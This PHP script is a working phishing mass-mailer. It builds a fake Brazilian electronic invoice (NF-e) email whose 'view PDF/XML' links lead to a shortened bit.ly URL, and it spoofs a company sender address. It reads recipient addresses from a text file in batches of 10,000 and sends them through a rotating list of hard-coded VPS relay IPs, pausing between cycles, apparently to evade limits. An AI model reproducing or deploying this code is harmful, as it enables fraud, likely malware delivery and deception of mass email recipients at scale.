<?php
function sendmail($to)
{
	//Lista de VPS
	$vps = array('80.211.228.63','212.237.58.73','80.211.228.157','80.211.231.12','80.211.232.11','185.58.193.45','89.46.196.178','212.237.6.63','5.249.147.160','93.186.251.203','5.249.144.64','94.177.214.220','5.249.151.39','185.58.193.117');
	
	$link = 'http://bit.ly/2zjPl9u';
	$html = '
	<html>
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<title>NOTA FISCAL</title>
	</head>
	<body>
	<div>
		<span><strong>Emissão de NF-e (Nota Fiscal Eletrônica)</strong></span>
	</div>
	<div><span>Prezado (A)</span></div>
	<div></div>
	<div>
		<span>
			Foi emitida uma NF-e (Nota Fiscal Eletrônica) referente ao seu pedido nº 775320791, realizado em 18/10/2017 as 14:19
		</span>
	</div>
	<div></div>
	<div><span>NF-e Nota Fiscal Eletrônica</span></div>
	<div></div>
	<div><span>Escolha abaixo a melhor forma de consultar sua NF-e</span></div>
	<span><br></span>
	<ul>
		<li><big><a href="'.$link.'">Visualizar em formato PDF</a></big></li>
		<li><big><a href="'.$link.'">Visualizar em formato XML</a></big></li>
	</ul>
	</body>
	</html>
	';
	$assunto = 'NOTA FISCAL';
	$nome = 'FCT NOTA FISCAL';
	$de = 'contato@fct.com.br';
	
	global $envios;
	$envios++;
	if($envios>count($vps))
	{
		$envios = 0;
		sleep(600);
	}
	
	$cr = curl_init();   
	curl_setopt($cr, CURLOPT_URL, "http://".$vps[$envios]."/a.php");
	curl_setopt($cr, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($cr, CURLOPT_POST, TRUE);
	curl_setopt($cr, CURLOPT_POSTFIELDS, "veio=sim&html=".$html."&assunto=".$assunto."&nome=".$nome."&de=".$de."&emails=".$to);
	$retorno = curl_exec($cr);
	curl_close($cr);
	return $retorno;
}



if(isset($_POST['logar']))
{
	echo 'Inicializando... <br>';
	$handle = @fopen("emails.txt", "r");
	$quantidade = 10000;
	$cont = 0;
	$envios = 0;
	if($handle)
	{
		echo 'Lista de Emails Selecionada ... <br>';
		$to = "";
		while(($buffer = fgets($handle, 4096)) !== false)
		{
			$to .= $buffer.",";
			$cont++;
			if($cont >= $quantidade)
			{
				echo sendmail($to);
				$cont = 0;
				$to = "";
			}
		}
		fclose($handle);
	}	
}
else
{	
	echo '<form action="'.$_SERVER['PHP_SELF'].'" method="post">';
		echo '<input type="submit" name="logar" id="logar" value="logar" />';
	echo '</form>';
}
?>